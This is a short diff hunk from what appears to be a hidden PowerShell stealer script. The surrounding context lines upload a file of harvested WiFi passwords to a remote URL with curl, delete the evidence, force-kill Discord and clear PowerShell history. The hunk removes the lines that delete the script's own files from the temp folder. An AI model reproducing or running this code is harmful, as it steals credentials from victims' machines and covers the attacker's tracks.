@@ -16,9 +16,6 @@ PowerShell.exe -WindowStyle hidden {
   curl.exe -F "file2=@WIFI-$namepc.txt" $url;
 # Delete wifi password#
   Remove-Item "WIFI-$namepc.txt" -Force -Recurse;#
-# Delete this script
-  Remove-Item  $env:temp\d.ps1 -Force -Recurse;
-  Remove-Item  $env:temp\p.ps1 -Force -Recurse;
 #Last discord kill before quit
   taskkill /IM Discord.exe /F
 # Clear History powershell
